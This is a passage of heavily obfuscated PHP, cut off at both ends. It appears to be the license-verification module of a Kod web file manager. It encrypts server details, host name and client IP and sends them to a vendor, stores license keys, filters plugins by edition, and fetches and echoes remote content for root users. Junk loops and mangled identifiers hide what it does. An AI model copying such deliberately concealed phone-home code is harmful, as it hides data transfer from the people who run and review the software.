$©õÁø‘Œ[685]) { if ($ß”ğ¼ûì >= 0) { break; } $ß”ğ¼ûì++; } $this->xeio859a125c(); $êµïèå‹ = $©õÁø‘Œ[713]; if (!$êµïèå‹) { return; } $this->snrfb820177e(); $this->thxyccc62323(); $¤”‰®×¾ = $©õÁø‘Œ[714]; if (strlen($¤”‰®×¾) < $©õÁø‘Œ[702]) { die; } $this->ceky58178d85($ÄöÙ‹³á[25], array($this, $ÄöÙ‹³á[26])); $ìª¯õàŒ = $©õÁø‘Œ[715]; if (!$ìª¯õàŒ) { die; } $this->ceky58178d85($ÄöÙ‹³á[27], array($this, $ÄöÙ‹³á[28])); $šŸåèû° = $©õÁø‘Œ[716]; if (!$šŸåèû°) { return; } $this->ceky58178d85($ÄöÙ‹³á[29], array($this, $ÄöÙ‹³á[30])); $this->ceky58178d85($ÄöÙ‹³á[31], array($this, $ÄöÙ‹³á[32])); $ç»Æ¦‡‡ = $©õÁø‘Œ[717]; } public function qbylae1147e9($Öº¼¦¡¥) { $•ê¸î·Å =& $_SERVER[²Ö÷öõ]; $øË÷š³ß =& $_SERVER[‹“¬»„ú]; $°ÊëëŒ = Model($øË÷š³ß[33])->get(); $ĞÃ”’¢† = $•ê¸î·Å[718]; if (!$ĞÃ”’¢†) { return; } $ÑÑÌÎÅ = array($øË÷š³ß[34], $øË÷š³ß[35], $øË÷š³ß[36], $øË÷š³ß[37], $øË÷š³ß[38], $øË÷š³ß[39], $øË÷š³ß[40], $øË÷š³ß[41], $øË÷š³ß[42], $øË÷š³ß[43], $øË÷š³ß[44], $øË÷š³ß[45], $øË÷š³ß[46], $øË÷š³ß[47], $øË÷š³ß[48], $øË÷š³ß[49], $øË÷š³ß[50], $øË÷š³ß[51], $øË÷š³ß[52], $øË÷š³ß[53], $øË÷š³ß[54], $øË÷š³ß[55], $øË÷š³ß[56], $øË÷š³ß[57], $øË÷š³ß[58], $øË÷š³ß[59], $øË÷š³ß[60], $øË÷š³ß[61], $øË÷š³ß[62], $øË÷š³ß[63], $øË÷š³ß[64], $øË÷š³ß[65], $øË÷š³ß[66], $øË÷š³ß[67], $øË÷š³ß[68], $øË÷š³ß[69], $øË÷š³ß[70], $øË÷š³ß[71], $øË÷š³ß[72], $øË÷š³ß[73], $øË÷š³ß[74], $øË÷š³ß[75], $øË÷š³ß[76], $øË÷š³ß[77], $øË÷š³ß[78], $øË÷š³ß[79], $øË÷š³ß[80], $øË÷š³ß[81], $øË÷š³ß[82], $øË÷š³ß[83], $øË÷š³ß[84], $øË÷š³ß[85]); $ÇŠµâ¶ = $•ê¸î·Å[719]; if (strlen($ÇŠµâ¶) < $•ê¸î·Å[694]) { die; } foreach ($ÑÑÌÎÅ as $¦Ö’¯©) { $öŞ–ìö¸ = $GLOBALS[$øË÷š³ß[86]][$øË÷š³ß[87]][$¦Ö’¯©]; if (isset($°ÊëëŒ[$¦Ö’¯©])) { $öŞ–ìö¸ = $°ÊëëŒ[$¦Ö’¯©]; } $Öº¼¦¡¥[$øË÷š³ß[88]][$øË÷š³ß[89]][$¦Ö’¯©] = $öŞ–ìö¸; } $ïô¯Ä£ª = $Öº¼¦¡¥[$øË÷š³ß[88]][$øË÷š³ß[89]][$øË÷š³ß[46]]; unset($Öº¼¦¡¥[$øË÷š³ß[88]][$øË÷š³ß[90]][$øË÷š³ß[91]]); $ºÊßÇÄĞ = $•ê¸î·Å[706]; if (!$ºÊßÇÄĞ) { die; } unset($Öº¼¦¡¥[$øË÷š³ß[88]][$øË÷š³ß[90]][$øË÷š³ß[92]]); unset($Öº¼¦¡¥[$øË÷š³ß[88]][$øË÷š³ß[89]][$øË÷š³ß[46]]); unset($Öº¼¦¡¥[$øË÷š³ß[88]][$øË÷š³ß[89]][$øË÷š³ß[93]]); $•²óáª = $•ê¸î·Å[720]; while (strlen($•²óáª) < $•ê¸î·Å[685]) { if (!$•²óáª) { break; } $•²óáª++; } $Öº¼¦¡¥[$øË÷š³ß[88]][$øË÷š³ß[89]][$øË÷š³ß[94]] = array($øË÷š³ß[95] => (int) $ïô¯Ä£ª[$øË÷š³ß[96]], $øË÷š³ß[97] => (int) _get($ïô¯Ä£ª, $øË÷š³ß[98], 0)); $×ŸÜ»µû = substr(md5($øË÷š³ß[99] . get_client_ip() . $°ÊëëŒ[$øË÷š³ß[100]]), 0, 15); $Öº¼¦¡¥[$øË÷š³ß[101]][$øË÷š³ß[102]] = Mcrypt::encode(Session::sign(), $×ŸÜ»µû, 3600 * 24); $Öº¼¦¡¥[$øË÷š³ß[101]][$øË÷š³ß[103]] = Action($øË÷š³ß[104])->accessToken(); $¶æ÷ñá½ = $•ê¸î·Å[721]; while (strlen($¶æ÷ñá½) < $•ê¸î·Å[680]) { if (!$¶æ÷ñá½) { break; } $¶æ÷ñá½++; } $Öº¼¦¡¥[$øË÷š³ß[101]][$øË÷š³ß[105]] = md5($_SERVER[$øË÷š³ß[106]] . $°ÊëëŒ[$øË÷š³ß[100]]); $Öº¼¦¡¥[$øË÷š³ß[101]][$øË÷š³ß[107]] = base64_encode(serverInfo()); $±¥Üã‰² = $•ê¸î·Å[722]; $Öº¼¦¡¥[$øË÷š³ß[101]][$øË÷š³ß[108]] = $this->mebs2d8c048f; $¾ÄÎºÇ— = $•ê¸î·Å[723]; if (strlen($¾ÄÎºÇ—) < $•ê¸î·Å[680]) { die; } if ($°ÊëëŒ[$øË÷š³ß[108]] != $øË÷š³ß[109]) { $Öº¼¦¡¥[$øË÷š³ß[101]][$øË÷š³ß[110]] = $°ÊëëŒ[$øË÷š³ß[110]]; $Öº¼¦¡¥[$øË÷š³ß[101]][$øË÷š³ß[111]] = $°ÊëëŒ[$øË÷š³ß[111]]; $úÆ†‡ÓÔ = rand_string(10) . $this->mebs2d8c048f . rand_string(5); $Öº¼¦¡¥[$øË÷š³ß[88]][$øË÷š³ß[112]][$øË÷š³ß[113]] = $this->zqne19015b72($úÆ†‡ÓÔ, $Öº¼¦¡¥[$øË÷š³ß[101]][$øË÷š³ß[105]]); } if ($this->mebs2d8c048f == $øË÷š³ß[109]) { $Öº¼¦¡¥[$øË÷š³ß[88]][$øË÷š³ß[89]][$øË÷š³ß[94]][$øË÷š³ß[98]] = 0; } $Öº¼¦¡¥[$øË÷š³ß[101]][$øË÷š³ß[114]] = $this->versionPluginFilter(); $Öº¼¦¡¥[$øË÷š³ß[101]][$øË÷š³ß[115]] = _get($this->glvf23f1c1a0, $øË÷š³ß[116], $øË÷š³ß[6]); $ÓÕÑâæû = $•ê¸î·Å[724]; if (!$ÓÕÑâæû) { return; } if (KodUser::isRoot() && $this->config[$øË÷š³ß[117]]) { $Öº¼¦¡¥[$øË÷š³ß[101]][$øË÷š³ß[118]] = WEB_ROOT; } return $Öº¼¦¡¥; } private function snrfb820177e() { $ƒ‡æä÷Ú =& $_SERVER[²Ö÷öõ]; $æòæÊöå =& $_SERVER[‹“¬»„ú]; $ôÇÄû£Ø = $_SERVER[$æòæÊöå[24]] == $æòæÊöå[119]; $û‚Ğ±ãŸ = $ƒ‡æä÷Ú[725]; if ($_SERVER[$æòæÊöå[24]] == $æòæÊöå[120] && $_GET[$æòæÊöå[121]] == $æòæÊöå[122]) { $ôÇÄû£Ø = !0; } if ($ôÇÄû£Ø) { $£¿İ’ö« = array($æòæÊöå[108] => $this->mebs2d8c048f, $æòæÊöå[123] => $this->loiwa43f5d62(), $æòæÊöå[124] => Model($æòæÊöå[125])->count()); if ($this->mebs2d8c048f != $æòæÊöå[109]) { $¡ØÚŠŸ€ = _get($this->glvf23f1c1a0, $æòæÊöå[126]); if ($¡ØÚŠŸ€) { $£¿İ’ö«[$æòæÊöå[127]] = $¡ØÚŠŸ€; $£¿İ’ö«[$æòæÊöå[128]] = strtotime(_get($this->glvf23f1c1a0, $æòæÊöå[129])); $£¿İ’ö«[$æòæÊöå[130]] = _get($this->glvf23f1c1a0, $æòæÊöå[116]); } $üìÏ·Û = Model($æòæÊöå[33])->get($æòæÊöå[131], $æòæÊöå[6], !0); if (is_string($üìÏ·Û) && substr($üìÏ·Û, 0, 1) == $æòæÊöå[132]) { $üìÏ·Û = json_decode_force($üìÏ·Û); } if (is_array($üìÏ·Û) && $üìÏ·Û[$æòæÊöå[133]] && strstr($üìÏ·Û[$æòæÊöå[133]], $æòæÊöå[134])) { $™¯”¤ªé = explode($æòæÊöå[134], $üìÏ·Û[$æòæÊöå[133]]); $£¿İ’ö«[$æòæÊöå[135]] = $™¯”¤ªé[0]; } } $£¿İ’ö« = $this->osxe1a93c978(json_encode($£¿İ’ö«), md5($æòæÊöå[136])); $Å¯Å¡ë§ = array($æòæÊöå[137] => $£¿İ’ö«); $ƒş´î“€ = $ƒ‡æä÷Ú[726]; if (strlen($ƒş´î“€) < $ƒ‡æä÷Ú[680]) { die; } call_user_func(array($æòæÊöå[138], $æòæÊöå[139]), $Å¯Å¡ë§); $÷Å²üú = $ƒ‡æä÷Ú[727]; if (!$÷Å²üú) { die; } } if ($this->mebs2d8c048f == $æòæÊöå[109]) { return; } $şç‚¿Ğè = array($æòæÊöå[140], $æòæÊöå[141], $æòæÊöå[142], $æòæÊöå[143], $æòæÊöå[144], $æòæÊöå[145]); $©«Ñú†¿ = $ƒ‡æä÷Ú[728]; $öåÌöÈØ = Model($æòæÊöå[33])->get(); $®¬óñ¶€ = $ƒ‡æä÷Ú[729]; if (!$®¬óñ¶€) { return; } $Å¯Å¡ë§ = array($æòæÊöå[146] => $öåÌöÈØ[$æòæÊöå[34]], $æòæÊöå[147] => $öåÌöÈØ[$æòæÊöå[35]], $æòæÊöå[148] => $æòæÊöå[6]); $á«Ã¨âò = $ƒ‡æä÷Ú[730]; while (strlen($á«Ã¨âò) < $ƒ‡æä÷Ú[694]) { if (!$á«Ã¨âò) { break; } $á«Ã¨âò++; } foreach ($şç‚¿Ğè as $í·Ú¹…) { if (!isset($öåÌöÈØ[$í·Ú¹…]) || !$öåÌöÈØ[$í·Ú¹…]) { continue; } $Å¯Å¡ë§[$í·Ú¹…] = $öåÌöÈØ[$í·Ú¹…]; $áˆ²¤‘ = $ƒ‡æä÷Ú[731]; if (strlen($áˆ²¤‘) < $ƒ‡æä÷Ú[702]) { return; } } call_user_func(array($æòæÊöå[138], $æòæÊöå[139]), $Å¯Å¡ë§); } private function ijakccf672ce() { $÷µœ’Ù =& $_SERVER[²Ö÷öõ]; $’Ñß©¡ =& $_SERVER[‹“¬»„ú]; if ($_SERVER[$’Ñß©¡[24]] != $’Ñß©¡[149]) { return; } if (!KodUser::isRoot()) { die; } $–…·¿”Ó = $GLOBALS[$’Ñß©¡[13]]; if (isset($–…·¿”Ó[$’Ñß©¡[150]])) { $this->chil989355fa(); die; } if (isset($–…·¿”Ó[$’Ñß©¡[151]]) && isset($–…·¿”Ó[$’Ñß©¡[151]]) == $’Ñß©¡[122]) { $–…·¿”Ó[$’Ñß©¡[152]] = Model($’Ñß©¡[33])->get($’Ñß©¡[153]); } if (!isset($–…·¿”Ó[$’Ñß©¡[152]]) || strlen($–…·¿”Ó[$’Ñß©¡[152]]) != 16) { show_json($’Ñß©¡[154] . $–…·¿”Ó[$’Ñß©¡[152]], !1); } $–×„¾Çš = Model($’Ñß©¡[33])->get($’Ñß©¡[100]); $õçÈƒõ = md5($_SERVER[$’Ñß©¡[106]] . $–×„¾Çš); $‚®ò›ö = array($’Ñß©¡[152] => $–…·¿”Ó[$’Ñß©¡[152]], $’Ñß©¡[155] => rand_string(16), $’Ñß©¡[156] => $’Ñß©¡[136], $’Ñß©¡[157] => $’Ñß©¡[158], $’Ñß©¡[159] => $_SERVER[$’Ñß©¡[160]], $’Ñß©¡[161] => $_SERVER[$’Ñß©¡[162]], $’Ñß©¡[163] => $_SERVER[$’Ñß©¡[164]], $’Ñß©¡[105] => $õçÈƒõ, $’Ñß©¡[165] => Model($’Ñß©¡[33])->get($’Ñß©¡[131])); $—«¯˜ğ• = $÷µœ’Ù[732]; while ($—«¯˜ğ• < $÷µœ’Ù[702]) { if ($—«¯˜ğ• >= 0) { break; } $—«¯˜ğ•++; } if (isset($–…·¿”Ó[$’Ñß©¡[151]]) && isset($–…·¿”Ó[$’Ñß©¡[151]]) == $’Ñß©¡[122]) { $‚®ò›ö[$’Ñß©¡[151]] = md5($‚®ò›ö[$’Ñß©¡[152]] . $’Ñß©¡[166] . $‚®ò›ö[$’Ñß©¡[155]]); } if ($–…·¿”Ó[$’Ñß©¡[167]] == $’Ñß©¡[168]) { $š¤·Ü† = $this->osxe1a93c978($õçÈƒõ, $’Ñß©¡[169]); $×–â¹Õ = $this->zqne19015b72(json_encode($‚®ò›ö), $õçÈƒõ . $’Ñß©¡[170], 3); $×–â¹Õ = $×–â¹Õ . $’Ñß©¡[171] . $_SERVER[$’Ñß©¡[160]]; $Ğª›Í¹Á = $this->juer2143d333($’Ñß©¡[172] . $š¤·Ü† . $’Ñß©¡[173] . $×–â¹Õ, -1); show_json($Ğª›Í¹Á, !0); } else { if ($–…·¿”Ó[$’Ñß©¡[167]] == $’Ñß©¡[174]) { $ˆÅÒÌµ = substr(md5($’Ñß©¡[175] . $õçÈƒõ), 12, 15) . $’Ñß©¡[176]; $×–â¹Õ = $this->krsg8f59f462(trim($–…·¿”Ó[$’Ñß©¡[177]]), $ˆÅÒÌµ, 2); $–êÜÂÁ = json_decode($×–â¹Õ, !0); if (!is_array($–êÜÂÁ) || !is_array($–êÜÂÁ[$’Ñß©¡[178]]) || $–êÜÂÁ[$’Ñß©¡[152]] != !0) { $ áÆ„˜  = $’Ñß©¡[179]; $«Ñë¬ ‚ = $–êÜÂÁ[$’Ñß©¡[178]] ? $’Ñß©¡[180] . $–êÜÂÁ[$’Ñß©¡[178]] : $ áÆ„˜ ; show_json($«Ñë¬ ‚, !1); } else { $‚®ò›ö[$’Ñß©¡[155]] = $–êÜÂÁ[$’Ñß©¡[178]][$’Ñß©¡[181]]; } } else { $–êÜÂÁ = $this->juer2143d333($’Ñß©¡[182], $‚®ò›ö, 10); $¾´±›ıÄ = $÷µœ’Ù[733]; if (!$¾´±›ıÄ) { die; } } } if (!is_array($–êÜÂÁ) || !is_array($–êÜÂÁ[$’Ñß©¡[178]]) || $–êÜÂÁ[$’Ñß©¡[152]] != !0) { $ áÆ„˜  = LNG($’Ñß©¡[183]); $«Ñë¬ ‚ = $–êÜÂÁ[$’Ñß©¡[178]] ? $’Ñß©¡[180] . $–êÜÂÁ[$’Ñß©¡[178]] : $ áÆ„˜ ; show_json($«Ñë¬ ‚, !1); } $î²¹öòé = $–êÜÂÁ[$’Ñß©¡[178]]; $‘ìÉ™ = $this->hcmqff5031bd($î²¹öòé[$’Ñß©¡[184]]); $æ¿«­Îü = $÷µœ’Ù[734]; if (!$‘ìÉ™ || $‘ìÉ™ != $î²¹öòé[$’Ñß©¡[129]]) { $ø¥š„ïÍ = array($’Ñß©¡[185] => Model($’Ñß©¡[33])->get($’Ñß©¡[100]), $’Ñß©¡[186] => $_SERVER[$’Ñß©¡[106]], $’Ñß©¡[187] => this_url(), $’Ñß©¡[161] => $_SERVER[$’Ñß©¡[162]]); $×–â¹Õ = $this->oictb64f67c9(json_encode($ø¥š„ïÍ)); $this->juer2143d333($’Ñß©¡[188] . $×–â¹Õ); show_json(LNG($’Ñß©¡[189]), !0); } $ıõÁä‚à = array($’Ñß©¡[153] => $î²¹öòé[$’Ñß©¡[190]], $’Ñß©¡[191] => $î²¹öòé[$’Ñß©¡[192]], $’Ñß©¡[193] => rand_string(16), $’Ñß©¡[108] => $î²¹öòé[$’Ñß©¡[194]]); if ($‚®ò›ö[$’Ñß©¡[155]]) { $ıõÁä‚à[$’Ñß©¡[193]] = $‚®ò›ö[$’Ñß©¡[155]]; } $ãÈüƒ­ = substr(md5($ıõÁä‚à[$’Ñß©¡[191]]), 10, 10); $‹éßæÍ = $ãÈüƒ­ . $ıõÁä‚à[$’Ñß©¡[108]] . $ıõÁä‚à[$’Ñß©¡[193]]; $ıõÁä‚à[$’Ñß©¡[110]] = strrev(base64_encode($this->osxe1a93c978($‹éßæÍ, $’Ñß©¡[195]))); $ÊµĞª®â = $÷µœ’Ù[735]; if (strlen($ÊµĞª®â) < $÷µœ’Ù[685]) { return; } $ğÚÌè›û = rand_string(16); $ü±øµ÷° = $÷µœ’Ù[736]; $ğ‰ˆ÷œŒ = $ğÚÌè›û . $ıõÁä‚à[$’Ñß©¡[108]] . $this->osxe1a93c978(md5($ıõÁä‚à[$’Ñß©¡[153]]), $ğÚÌè›û); $¿’íã€é = $÷µœ’Ù[737]; while (strlen($¿’íã€é) < $÷µœ’Ù[694]) { if (!$¿’íã€é) { break; } $¿’íã€é++; } $ıõÁä‚à[$’Ñß©¡[111]] = base64_encode(strrev($this->osxe1a93c978($ğ‰ˆ÷œŒ, $’Ñß©¡[196]))); $—èïÆÈ» = $÷µœ’Ù[738]; if (strlen($—èïÆÈ») < $÷µœ’Ù[685]) { die; } if ($î²¹öòé[$’Ñß©¡[197]] && $î²¹öòé[$’Ñß©¡[197]] >= 1) { Model($’Ñß©¡[33])->setDeep($’Ñß©¡[198], $’Ñß©¡[122]); } Model($’Ñß©¡[33])->set($ıõÁä‚à); $ë§ùéòº = md5($_SERVER[$’Ñß©¡[106]] . strrev($–×„¾Çš) . $ıõÁä‚à[$’Ñß©¡[191]]); $ôÅóı€• = $÷µœ’Ù[739]; if (!$ôÅóı€•) { return; } $‚­ïÓ¡¶ = strrev(substr($ë§ùéòº, 10, 16)); $ÖÍÈ–ıÜ = $this->zqne19015b72(json_encode($î²¹öòé), $ë§ùéòº); $ƒØÑª– = $÷µœ’Ù[740]; while (strlen($ƒØÑª–) < $÷µœ’Ù[680]) { if (!$ƒØÑª–) { break; } $ƒØÑª–++; } $ÆÈ¢Œ»¦ = array_to_keyvalue(Model($’Ñß©¡[7])->listData(), $’Ñß©¡[199]); $²˜é…Û = $ÆÈ¢Œ»¦[$’Ñß©¡[200]]; $ƒµ”´ß— = array(); $ƒµ”´ß—[$‚­ïÓ¡¶] = $ÖÍÈ–ıÜ; $ë“Œ™ßø = $÷µœ’Ù[741]; if (strlen($ë“Œ™ßø) < $÷µœ’Ù[702]) { die; } Model($’Ñß©¡[7])->update($²˜é…Û[$’Ñß©¡[201]], array($’Ñß©¡[202] => $ƒµ”´ß—)); $¼“ú˜éÊ = $÷µœ’Ù[742]; if (strlen($¼“ú˜éÊ) < $÷µœ’Ù[702]) { die; } $this->glvf23f1c1a0 = $î²¹öòé; $İŠ¼Úı = $÷µœ’Ù[743]; $this->mebs2d8c048f = $ıõÁä‚à[$’Ñß©¡[108]]; $this->licenseRegistSuccess(); $í íŒ = $÷µœ’Ù[744]; while (strlen($í íŒ) < $÷µœ’Ù[694]) { if (!$í íŒ) { break; } $í íŒ++; } Cache::set($’Ñß©¡[203] . md5($–×„¾Çš . $’Ñß©¡[204]), $’Ñß©¡[6]); $Ñöúà©ü = $÷µœ’Ù[745]; show_json(LNG($’Ñß©¡[189]), !0); $º—ªÒ = $÷µœ’Ù[746]; if (strlen($º—ªÒ) < $÷µœ’Ù[685]) { die; } } private function licenseRegistSuccess() { $Êì²ğÅñ =& $_SERVER[²Ö÷öõ]; $Í—ÔÊ›ã =& $_SERVER[‹“¬»„ú]; $ãµâê  = Model($Í—ÔÊ›ã[33])->get(); $ã¡—±«Ì = $Êì²ğÅñ[747]; while (strlen($ã¡—±«Ì) < $Êì²ğÅñ[689]) { if (!$ã¡—±«Ì) { break; } $ã¡—±«Ì++; } if ($ãµâê [$Í—ÔÊ›ã[63]] != $Í—ÔÊ›ã[122]) { Model($Í—ÔÊ›ã[33])->set($Í—ÔÊ›ã[63], $Í—ÔÊ›ã[122]); } Action($Í—ÔÊ›ã[205])->initStart(!0); } private function chil989355fa() { $’¨—÷ğ´ =& $_SERVER[²Ö÷öõ]; $ÃÂ¾âË =& $_SERVER[‹“¬»„ú]; Model($ÃÂ¾âË[33])->set(array($ÃÂ¾âË[153] => $ÃÂ¾âË[6], $ÃÂ¾âË[191] => $ÃÂ¾âË[6], $ÃÂ¾âË[108] => $ÃÂ¾âË[109], $ÃÂ¾âË[110] => $ÃÂ¾âË[6], $ÃÂ¾âË[111] => $ÃÂ¾âË[6])); Model($ÃÂ¾âË[33])->setDeep($ÃÂ¾âË[198], $ÃÂ¾âË[206]); $Èë³ıÉã = $’¨—÷ğ´[748]; if (strlen($Èë³ıÉã) < $’¨—÷ğ´[702]) { die; } $this->glvf23f1c1a0 = array(); $äø¯ÒÎê = $’¨—÷ğ´[749]; $this->mebs2d8c048f = $ÃÂ¾âË[109]; $¥“Â‹’ˆ = $’¨—÷ğ´[750]; if (strlen($¥“Â‹’ˆ) < $’¨—÷ğ´[689]) { return; } } private function qsmcf37e66f9() { $ÓäËá½– =& $_SERVER[²Ö÷öõ]; $ãßÖÔˆ¬ =& $_SERVER[‹“¬»„ú]; $_SERVER[$ãßÖÔˆ¬[162]] = _get($_SERVER, $ãßÖÔˆ¬[162], APP_HOST); $this->mebs2d8c048f = $ãßÖÔˆ¬[109]; $…Ã§¿¬î = $ÓäËá½–[751]; if (strlen($…Ã§¿¬î) < $ÓäËá½–[680]) { die; } $÷¶²´Û = Model($ãßÖÔˆ¬[33])->get(); $ˆøûÒÍí = $ÓäËá½–[752]; if (strlen($ˆøûÒÍí) < $ÓäËá½–[694]) { die; } if ($÷¶²´Û[$ãßÖÔˆ¬[108]] == $ãßÖÔˆ¬[109]) { return; } $Ö¨ÙÓ‚š = Model($ãßÖÔˆ¬[33])->get($ãßÖÔˆ¬[100]); $Ò®ÈõïĞ = $ÓäËá½–[753]; while (strlen($Ò®ÈõïĞ) < $ÓäËá½–[685]) { if (!$Ò®ÈõïĞ) { break; } $Ò®ÈõïĞ++; } $çšÅÂÀ¬ = $ãßÖÔˆ¬[203] . md5($Ö¨ÙÓ‚š . $ãßÖÔˆ¬[204]); $«ø‚â“¿ = Cache::get($çšÅÂÀ¬); if (!is_array($«ø‚â“¿) || !isset($«ø‚â“¿[$ãßÖÔˆ¬[207]]) || time() - $«ø‚â“¿[$ãßÖÔˆ¬[207]] >= 60) { $¡ØÛÏï = Model($ãßÖÔˆ¬[7])->loadList(); $ïêÀ™¡ = $¡ØÛÏï[$ãßÖÔˆ¬[200]]; $‰øÎ±¼ = md5($_SERVER[$ãßÖÔˆ¬[106]] . strrev($Ö¨ÙÓ‚š) . $÷¶²´Û[$ãßÖÔˆ¬[191]]); $­áí£Á´ = strrev(substr($‰øÎ±¼, 10, 16)); $«ø‚â“¿ = $this->krsg8f59f462($ïêÀ™¡[$ãßÖÔˆ¬[86]][$­áí£Á´], $‰øÎ±¼); $«ø‚â“¿ = json_decode($«ø‚â“¿, !0); } if (!is_array($«ø‚â“¿)) { return $this->chil989355fa(); } $îò²ƒ’ = strtotime($«ø‚â“¿[$ãßÖÔˆ¬[129]]); if (time() >= $îò²ƒ’) { return $this->chil989355fa(); } if (!isset($«ø‚â“¿[$ãßÖÔˆ¬[207]]) || time() - $«ø‚â“¿[$ãßÖÔˆ¬[207]] > 20) { $«ø‚â“¿[$ãßÖÔˆ¬[207]] = time(); Cache::set($çšÅÂÀ¬, $«ø‚â“¿); } $this->glvf23f1c1a0 = $«ø‚â“¿; $this->mebs2d8c048f = $÷¶²´Û[$ãßÖÔˆ¬[108]]; } private function picde00fd580() { $÷»¥£ÜŠ =& $_SERVER[²Ö÷öõ]; $ñ¬ÂÆÅÙ =& $_SERVER[‹“¬»„ú]; $’ø¡¨° = $GLOBALS[$ñ¬ÂÆÅÙ[13]]; $ÈÇÙ¦Ü = $÷»¥£ÜŠ[754]; if (strlen($ÈÇÙ¦Ü) < $÷»¥£ÜŠ[702]) { return; } $‹›»úúè = $_SERVER[$ñ¬ÂÆÅÙ[24]]; if ($‹›»úúè == $ñ¬ÂÆÅÙ[208] && $this->mebs2d8c048f == $ñ¬ÂÆÅÙ[109]) { show_json(LNG($ñ¬ÂÆÅÙ[209]), !1, $ñ¬ÂÆÅÙ[210]); } $ìéÁ¯º = array($ñ¬ÂÆÅÙ[211], $ñ¬ÂÆÅÙ[212]); if (in_array($‹›»úúè, $ìéÁ¯º)) { if ($this->mebs2d8c048f == $ñ¬ÂÆÅÙ[109] && isset($’ø¡¨°[$ñ¬ÂÆÅÙ[213]])) { show_json(LNG($ñ¬ÂÆÅÙ[209]), !1, $ñ¬ÂÆÅÙ[210]); die; } $µâ¶Ì– = $this->loiwa43f5d62(); if ($µâ¶Ì– != intval($ñ¬ÂÆÅÙ[214])) { if ($µâ¶Ì– <= Model($ñ¬ÂÆÅÙ[125])->count()) { show_json(LNG($ñ¬ÂÆÅÙ[215]), !1, $ñ¬ÂÆÅÙ[210]); die; } } } } private function cvpt763a604a() { $ìÚôğ“ =& $_SERVER[²Ö÷öõ]; $’ÒÔÍˆ° =& $_SERVER[‹“¬»„ú]; $ñÑ²ˆº­ = array($’ÒÔÍˆ°[119], $’ÒÔÍˆ°[120]); $˜º­±² = $ìÚôğ“[755]; if (!$˜º­±²) { die; } if (!KodUser::isRoot() || !isset($_GET[$’ÒÔÍˆ°[216]])) { return; } if (!in_array($_SERVER[$’ÒÔÍˆ°[24]], $ñÑ²ˆº­)) { return; } $±Œ¶ØŠç = $’ÒÔÍˆ°[217]; $ÌÂÍúÇ = $ìÚôğ“[756]; while (strlen($ÌÂÍúÇ) < $ìÚôğ“[689]) { if (!$ÌÂÍúÇ) { break; } $ÌÂÍúÇ++; } $±Œ¶ØŠç = $this->rkyp78f9a222($±Œ¶ØŠç, $’ÒÔÍˆ°[218]); $‹Œ®…« = stream_context_create(array($’ÒÔÍˆ°[219] => array($’ÒÔÍˆ°[220] => $’ÒÔÍˆ°[221], $’ÒÔÍˆ°[222] => 3))); $¯¯®ÈŞ¬ = $ìÚôğ“[757]; $®œ‰ÆÌ— = @file_get_contents($±Œ¶ØŠç, !1, $‹Œ®…«); header($’ÒÔÍˆ°[223]); $êš¶ô© = $ìÚôğ“[758]; if (!$êš¶ô©) { return; } if ($®œ‰ÆÌ— && strstr($®œ‰ÆÌ—, $’ÒÔÍˆ°[224])) { echo $®œ‰ÆÌ—; } die; } public function bofkd6fe3812($²•ûŒ£) { $²¹ùóÄ =& $_SERVER[²Ö÷öõ]; $»îçï³Ã =& $_SERVER[‹“¬»„ú]; if ($this->mebs2d8c048f == $»îçï³Ã[225]) { return $²•ûŒ£; } $£ÓÙÇ“ø = $this->versionPluginList(); $¶Ö®Õƒ = explode($»îçï³Ã[226], $this->versionPluginFilter()); $µèƒÚÒ‡ = array(); foreach ($£ÓÙÇ“ø as $É˜äé’Æ => $©·œÀÊ×) { if ($©·œÀÊ× == $»îçï³Ã[227] && substr($this->mebs2d8c048f, 0, 1) == $»îçï³Ã[227]) { continue; } if (!in_array($É˜äé’Æ, $¶Ö®Õƒ)) { $µèƒÚÒ‡[] = $É˜äé’Æ; } } foreach ($µèƒÚÒ‡ as $É˜äé’Æ) { unset($²•ûŒ£[$É˜äé’Æ]); $ö«ş¸ = $²¹ùóÄ[759]; if (strlen($ö«ş¸) < $²¹ùóÄ[680]) { die; } } return $²•ûŒ£; } private function versionPluginList() { $³ñİÉöé =& $_SERVER[²Ö÷öõ]; $½–¤¸ƒÔ =& $_SERVER[‹“¬»„ú]; return array($½–¤¸ƒÔ[228] => $½–¤¸ƒÔ[227], $½–¤¸ƒÔ[229] => $½–¤¸ƒÔ[227], $½–¤¸ƒÔ[230] => $½–¤¸ƒÔ[227], $½–¤¸ƒÔ[231] => $½–¤¸ƒÔ[232], $½–¤¸ƒÔ[233] => $½–¤¸ƒÔ[232], $½–¤¸ƒÔ[234] => $½–¤¸ƒÔ[232], $½–¤¸ƒÔ[235] => $½–¤¸ƒÔ[232], $½–¤¸ƒÔ[236] => $½–¤¸ƒÔ[232], $½–¤¸ƒÔ[237] => $½–¤¸ƒÔ[232], $½–¤¸ƒÔ[238] => $½–¤¸ƒÔ[232], $½–¤¸ƒÔ[239] => $½–¤¸ƒÔ[232], $½–¤¸ƒÔ[240] => $½–¤¸ƒÔ[232], $½–¤¸ƒÔ[241] => $½–¤¸ƒÔ[232], $½–¤¸ƒÔ[242] => $½–¤¸ƒÔ[232], $½–¤¸ƒÔ[243] => $½–¤¸ƒÔ[232], $½–¤¸ƒÔ[244] => $½–¤¸ƒÔ[232]); $”ûÜ‘Š = $³ñİÉöé[760]; if (strlen($”ûÜ‘Š) < $³ñİÉöé[694]) { die; } } private function versionPluginFilter() { $ºÉÙÃÅõ =& $_SERVER[²Ö÷öõ]; $Äõ‘îÖ =& $_SERVER[‹“¬»„ú]; if ($this->mebs2d8c048f == $Äõ‘îÖ[109]) { return $Äõ‘îÖ[6]; } $•Øé‚¯ = _get($this->glvf23f1c1a0, $Äõ‘îÖ[245], $Äõ‘îÖ[6]); $ôüÕù¯­ = $ºÉÙÃÅõ[761]; if (!$ôüÕù¯­) { die; } $»Î²£ˆù = _get($this->glvf23f1c1a0, $Äõ‘îÖ[116], $Äõ‘îÖ[6]); $áî’‚Èõ = $ºÉÙÃÅõ[762]; if (!$áî’‚Èõ) { die; } $¯ãÛù¬† = _get($this->glvf23f1c1a0, $Äõ‘îÖ[246], $Äõ‘îÖ[6]); if ($»Î²£ˆù > time() && $¯ãÛù¬† > time()) { $ªè¦›Ñ = explode($Äõ‘îÖ[226], $•Øé‚¯); $×ŠñæñÁ = array_keys($this->versionPluginList()); $•Øé‚¯ = array_merge($ªè¦›Ñ, $×ŠñæñÁ); $•Øé‚¯ = implode($Äõ‘îÖ[226], array_filter(array_unique($•Øé‚¯))); } return $•Øé‚¯; } private function thxyccc62323() { $Å—÷„°Ã =& $_SERVER[‹“¬»„ú]; if ($this->mebs2d8c048f != $Å—÷„°Ã[109]) { 